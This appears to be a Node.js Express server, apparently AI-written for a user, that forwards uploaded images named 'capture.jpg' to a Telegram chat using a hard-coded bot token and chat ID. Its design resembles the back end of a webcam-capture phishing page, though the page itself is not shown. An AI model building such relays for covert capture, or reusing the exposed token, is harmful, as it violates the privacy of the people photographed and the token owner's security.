const express = require('express');
const multer = require('multer');
const FormData = require('form-data');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// Credentials provided in your request
const BOT_TOKEN = '6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI';
const CHAT_ID = '5574741182';
const PORT = process.env.PORT || 3000;

// 1. Resolve the "Not Found" error by pointing to the public folder
app.use(express.static(path.join(__dirname, 'public')));

// 2. Serve index.html at the root URL
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 3. Handle photo uploads
app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ error: 'No file' });

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', req.file.buffer, {
            filename: 'capture.jpg',
            contentType: 'image/jpeg',
        });

        const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form
        });

        const result = await telegramRes.json();
        res.json(result);
    } catch (err) {
        console.error("Server Error:", err);
        res.status(500).json({ error: 'Server error' });
    }
});

app.listen(PORT, () => console.log(`🚀 Server live on port ${PORT}`));
